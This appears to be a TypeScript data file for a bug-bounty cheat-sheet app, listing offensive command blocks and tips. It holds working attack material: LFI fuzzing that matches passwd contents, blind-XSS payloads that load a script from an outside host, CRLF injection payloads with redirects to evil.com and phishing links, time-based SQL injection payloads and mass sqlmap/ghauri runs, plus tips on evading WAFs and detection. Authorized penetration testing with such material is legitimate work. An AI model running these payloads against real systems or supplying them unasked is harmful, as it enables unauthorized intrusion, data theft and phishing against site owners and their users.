    raw: "echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v",
    info: 'LFI methodology',
  },
  {
    command: 'dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1',
    raw: 'dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1',
    info: 'Directory Bruteforce - part 1',
  },
  {
    command: "ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json",
    raw: "ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json",
    info: 'Directory Bruteforce - part 2',
  },
  {
    command: "echo example.com | katana -d 5 | grep -E '\\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30",
    raw: "echo example.com | katana -d 5 | grep -E '\\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30",
    info: 'JS File hunting - part 1',
  },
  {
    command: 'cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/',
    raw: 'cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/',
    info: 'JS File hunting - part 2',
  },
  {
    command: 'subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl',
    raw: 'subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl',
    info: 'For Checking Subdomain takeover',
  },
  {
    command: "python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\\nCookie: SESSION=Hacked'",
    raw: "python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\\nCookie: SESSION=Hacked'",
    info: 'For finding CORS',
  },
  {
    command: "subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'",
    raw: "subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'",
    info: 'For testing header based blind xss',
  },
  {
    command: "echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln",
    raw: "echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln",
    info: 'For checking single xss on all urls',
  },
  {
    command: "subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters",
    raw: "subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters",
    info: 'For finding Blind xss',
  },
  {
    command: "echo domain | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'",
    raw: "echo domain | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'",
    info: 'Content-type Filter - part 1',
  },
  {
    command: "Ssl.cert.subject.CN:'example.com' 200",
    raw: "Ssl.cert.subject.CN:'example.com' 200",
    info: 'Shodan dork',
  },
  {
    command: 'echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt',
    raw: 'echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt',
    info: 'XSS method - part 1',
  },
  {
    command: "cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt",
    raw: "cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt",
    info: 'XSS method - part 2',
  },
  {
    command: "naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt",
    raw: "naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt",
    info: 'Naabu scan',
  },
  {
    command: 'nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan',
    raw: 'nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan',
    info: 'Nmap scan',
  },
  {
    command: 'masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt',
    raw: 'masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt',
    info: 'Masscan',
  },
  {
    command: "ffuf -request lfi -request-proto https -w /root/wordlists/offensive payloads/LFI payload.txt -c -mr 'root:'",
    raw: "ffuf -request lfi -request-proto https -w /root/wordlists/offensive payloads/LFI payload.txt -c -mr 'root:'",
    info: 'FFUF request file method - part 1',
  },
  {
    command: "ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert(\'XSS\')</script>'",
    raw: "ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert(\'XSS\')</script>'",
    info: 'FFUF request file method - part 2',
  },
  {
    command: `cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\\e[1;32m$url\\e[0m'

Method[1] X-Forwarded-For: xss+ssrf => $xss1

Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2

Method[3] Host: xss+ssrf ==> $xss3

Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 
;done`,
    raw: `cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\\e[1;32m$url\\e[0m'

Method[1] X-Forwarded-For: xss+ssrf => $xss1

Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2

Method[3] Host: xss+ssrf ==> $xss3

Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 
;done`,
    info: 'XSS and SSRF testing with headers',
  },
  {
    command: "echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'",
    raw: "echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'",
    info: 'LFI methodology - alternative method',
  },
]

const TIPS: string[] = [
  'Always verify live subdomains before further testing',
  'Use rate limiting to avoid getting blocked',
  'Combine passive and active recon for better results',
  'Check for common misconfigurations in cloud services',
  'Monitor for sensitive data exposure in public files',
  'Verify potential vulnerabilities before reporting',
  'Use multiple tools to ensure comprehensive coverage',
  'Document your findings and methodology',
]

const COMMAND_BLOCKS_API: CommandBlockDef[] = [
  {
    command: 'https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>',
    raw: 'https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>',
    info: 'VirusTotal API - Get domain report including subdomains and IPs',
  },
  {
    command: `curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=<api_key>" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`,
    raw: `curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=<api_key>" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`,
    info: 'Extract IP addresses from VirusTotal domain report',
  },
  {
    command: `curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>" | jq -r '.domain_siblings[]'`,
    raw: `curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>" | jq -r '.domain_siblings[]'`,
    info: 'Extract subdomains from VirusTotal domain report',
  },
  {
    command: `curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`,
    raw: `curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`,
    info: 'AlienVault OTX - Extract IP addresses from URL list',
  },
  {
    command: `curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`,
    raw: `curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'`,
    info: 'URLScan.io - Extract IP addresses from search results',
  },
  {
    command: 'https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey',
    raw: 'https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey',
    info: 'Wayback Machine - Get historical URLs for target domain',
  },
  {
    command: 'http.favicon.hash:1265477436',
    raw: 'http.favicon.hash:1265477436',
    info: 'Shodan - Search by favicon hash',
  },
  {
    command: `shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td`,
    raw: `shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td`,
    info: 'Shodan - Search SSL certificates and verify HTTP responses',
  },
  {
    command: 'nmap --script ssl-cert -p 443 <IP Address>',
    raw: 'nmap --script ssl-cert -p 443 <IP Address>',
    info: 'Nmap - Inspect SSL certificates on target IP',
  },
]

const TIPS_API: string[] = [
  'Always replace <api_key> with your actual API key',
  'Replace <DOMAIN> with the target domain',
  'Consider rate limits when making API requests',
  'Some APIs require authentication or paid subscriptions',
  'Use jq for better JSON parsing and filtering',
  'Combine multiple API results for better coverage',
  'Document all findings from each API source',
  'Verify findings manually before reporting',
  'Use different APIs to cross-validate results',
  'Keep track of API usage limits',
]

const TIPS_SSTI: string[] = [
  'Always start with basic detection payloads before attempting more complex exploits',
  'Different template engines require different payload structures',
  'Watch for error messages that might reveal the template engine in use',
  'Use URL encoding to bypass WAF and input filters',
  'Test payloads in different contexts (URL parameters, form fields, headers)',
  'Document successful payloads for each template engine encountered',
  'Be cautious with RCE payloads in production environments',
  'Consider the impact of failed payloads on the application',
  'Monitor response times for blind SSTI detection',
  'Use encoding variations to bypass security filters',
]

const COMMAND_BLOCKS_CRLF: CommandBlockDef[] = [
  {
    command: '%0d%0a%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E',
    raw: '%0d%0a%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E',
    info: 'Basic injection payload to test for CRLF vulnerabilities, adding extra headers or HTML.',
  },
  {
    command: '%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E',
    raw: '%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E',
    info: 'CRLF injection testing to bypass security headers like X-XSS-Protection and inject malicious scripts.',
  },
  {
    command: '%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E',
    raw: '%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E',
    info: 'Payload to redirect the victim to a malicious site using CRLF injection.',
  },
  {
    command: '%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a%0d%0a/%2f%2e%2e',
    raw: '%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a%0d%0a/%2f%2e%2e',
    info: 'Testing for script execution in SVG tags after CRLF injection and potential bypass techniques.',
  },
  {
    command: '%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E',
    raw: '%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E',
    info: 'Injecting an image tag with an onerror event to trigger a JavaScript prompt.',
  },
  {
    command: '%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A',
    raw: '%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A',
    info: 'Using an iframe to embed external content and potentially trick users into interacting with a malicious frame.',
  },
  {
    command: '%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A',
    raw: '%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A',
    info: 'Adding a crafted anchor tag to redirect users to a phishing page disguised as a legitimate link.',
  },
]

const TIPS_CRLF: string[] = [
  'Always encode your payloads properly to prevent breaking the target\'s application.',
  'Use tools like Burp Suite to inject payloads into headers and parameters effectively.',
  'Test various headers and parameters for injection points, as not all inputs are sanitized the same way.',
  'Combine CRLF injection with other vulnerabilities (e.g., XSS, open redirect) for more impactful exploitation.',
  'Document all testing results carefully, noting which headers or inputs were vulnerable.',
]

const TIPS_XSS_WAF: string[] = [
  'Test payloads against specific WAF versions',
  'Combine multiple encoding techniques',
  'Use different event handlers to bypass filters',
  'Try mixing HTML and JavaScript encoding',
  'Leverage legitimate HTML attributes',
  'Test with and without quotes/double quotes',
  'Use different case combinations',
  'Try adding multiple attributes',
  'Document successful bypasses for each WAF',
  'Always verify payload execution in the target context',
]

const TIPS_SQLI_XOR: string[] = [
  'Rotate between different XOR payload patterns to avoid detection',
  'Adjust sleep times based on target response characteristics',
  'Use URL encoding selectively to bypass WAF filters',
  'Combine XOR with other SQL operators for better evasion',
  'Test payloads with different string terminators',
  'Monitor response times carefully for blind injection confirmation',
  'Use nested queries to increase WAF bypass success rate',
  'Implement different sleep functions based on the database type',
]

const TIPS_GOOGLE_DORKS: string[] = [
  "Replace 'example.com' with your target domain",
  'Use [.] notation to avoid Google\'s automatic link creation',
  'Combine dorks for more specific results',
  'Use quotes for exact matches',
  'Monitor results over time for new exposures',
  'Document all findings systematically',
  'Verify findings before reporting',
  'Be mindful of scope and authorized testing boundaries',
  'Use advanced operators like -site: to exclude irrelevant results',
  'Consider using time-based filters for recent exposures',
]

const COMMAND_BLOCKS_SQLI: CommandBlockDef[] = [
  {
    command: "subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
    raw: "subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
    info: 'Single domain reconnaissance for potential SQL injectable endpoints',
  },
  {
    command: "subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
    raw: "subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
    info: 'Multiple subdomain reconnaissance for SQL injection testing',
  },
  {
    command: "echo https://example.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='",
    raw: "echo https://example.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='",
    info: 'Discover potential SQL injectable parameters using gau',
  },
  {
    command: "echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'",
    raw: "echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'",
    info: 'Alternative method for finding SQL injectable endpoints using katana',
  },
  {
    command: 'subfinder -d https://example.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm',
    raw: 'subfinder -d https://example.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm',
    info: 'Mass SQL injection testing using ghauri',
  },
  {
    command: 'subfinder -d https://example.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent',
    raw: 'subfinder -d https://example.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent',
    info: 'Comprehensive SQL injection testing using sqlmap',
  },
  {
    command: "curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'",
    raw: "curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'",
    info: 'Testing for time-based SQL injection via User-Agent header',
  },
  {
    command: "curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'",
    raw: "curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'",
    info: 'Testing for time-based SQL injection via X-Forwarded-For header',
  },
  {
    command: "curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'",
    raw: "curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'",
    info: 'Testing for time-based SQL injection via Referer header',
  },
  {
    command: "curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'",
    raw: "curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'",
    info: 'Alternative User-Agent based SQL injection test',
  },
  {
    command: "curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'",
    raw: "curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'",
    info: 'User-Agent header-based MySQL time-based injection',
  },
  {
    command: "curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'",
    raw: "curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'",
    info: 'X-Forwarded-For header-based MySQL time-based injection',
  },
  {
    command: "curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'",
    raw: "curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'",
    info: 'Referer header-based MySQL time-based injection',
  },
  {
    command: 'SELECT dbms_pipe.receive_message((\'a\'),10) FROM dual',
    raw: 'SELECT dbms_pipe.receive_message((\'a\'),10) FROM dual',
    info: 'Oracle database time-based injection payload',
  },
  {
    command: "WAITFOR DELAY '0:0:10'",
    raw: "WAITFOR DELAY '0:0:10'",
    info: 'Microsoft SQL Server time-based injection payload',
  },
  {
    command: 'SELECT pg_sleep(10)',
    raw: 'SELECT pg_sleep(10)',
    info: 'PostgreSQL time-based injection payload',
  },
  {
    command: 'SELECT sleep(10)',
    raw: 'SELECT sleep(10)',
    info: 'MySQL time-based injection payload',
  },
  {
    command: "0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z",
    raw: "0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z",
    info: 'MySQL alternative time-based payload with URL encoding',
  },
  {
    command: "'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1",
    raw: "'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1",
    info: 'PostgreSQL complex time-based injection payload',
  },
  {
    command: "if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/",
    raw: "if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/",
    info: 'MySQL multi-condition time-based payload with comment bypass',
  },
  {
    command: "1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--",
    raw: "1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--",
    info: 'Combined MySQL and MSSQL time-based payload',
  },
  {
    command: "paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1",
    raw: "paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1",
    info: 'Numeric parameter time-based injection payload',
  },
]

const TIPS_SQLI: string[] = [
  'Always test for different SQL database types (MySQL, PostgreSQL, Oracle, MSSQL)',
  'Use time-based payloads when blind SQL injection is suspected',
  'Test all input parameters, including headers and cookies',
  'Start with low-risk payloads before increasing complexity',
  'Monitor response times carefully for time-based injections',
  'Document all findings and successful payloads',
  'Use different encoding techniques to bypass WAF',
  'Always get proper authorization before testing',
  'Test numeric parameters with specific numeric-based payloads',
  'Try different comment syntax for different databases',
  'Use database-specific functions for more accurate detection',
  'Combine multiple techniques when basic payloads fail',
]
